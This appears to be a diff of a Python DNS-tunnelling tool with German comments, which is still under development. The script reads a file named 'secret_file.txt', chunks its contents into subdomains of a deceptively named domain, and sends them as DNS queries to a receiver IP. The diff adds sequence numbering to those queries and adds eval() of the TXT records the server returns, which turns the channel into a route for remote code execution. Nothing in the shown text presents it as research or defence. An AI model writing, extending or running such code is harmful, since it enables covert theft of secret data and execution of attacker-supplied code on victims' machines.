@@ -49,16 +49,19 @@ def send_minimal_dns_request(server_ip, domain :str, port):
         try:
             response_bytes, addr = sock.recvfrom(512)  # DNS-Antworten sind in der Regel maximal 512 Bytes
             response = dns.message.from_wire(response_bytes)  # Konvertiere die Antwort in ein lesbares DNS-Format
-            print_records(response, dns.rdatatype.TXT)
-
+            a =  eval(print_records(response, dns.rdatatype.TXT))
+            print("aaaaaaaaaaaa" + str(a))
+            print(type(a))
+            return a
         except socket.timeout:
             print("No response received (Timeout)")
-    return True
+
 def print_records(response, record_type):
     records = []
 
     for answer in response.answer:
         if answer.rdtype == record_type:
+            print("++++++++++++++++++" + str(answer.items))
             for item in answer.items:
                 if record_type == dns.rdatatype.A:
                     records.append(item.address)  # A-Records (IP-Adressen)
@@ -73,7 +76,7 @@ def print_records(response, record_type):
                 return record
     else:
         print(f"No {dns.rdatatype.to_text(record_type)} records found.")
-        return True
+    return False
 
 
 
@@ -82,7 +85,10 @@ if __name__ == "__main__":
     domain_base = ".notsuspicious.com"
     secret_text = read_file("secret_file.txt")
     size = 30
-    for i in range(1,(size*2+len(secret_text))//size):
+    number_of_packages = (size*2+len(secret_text))//size
+
+    print("##############" + str(number_of_packages))
+    for i in range(1,number_of_packages):
         resp = True
         while resp:
             if len(secret_text)>=size*(i+1):
@@ -92,7 +98,7 @@ if __name__ == "__main__":
             else:
                 print("ERROR:Index went past Domain Name length")
                 break
-            current_domain += domain_base
+            current_domain += "."+ str(number_of_packages - i -1)+domain_base
             print(current_domain)
             print(f"Sending DNS request {i}")  # Zähle die Anfragen mit
             resp = send_minimal_dns_request(receiver_ip, str(current_domain), 12345)
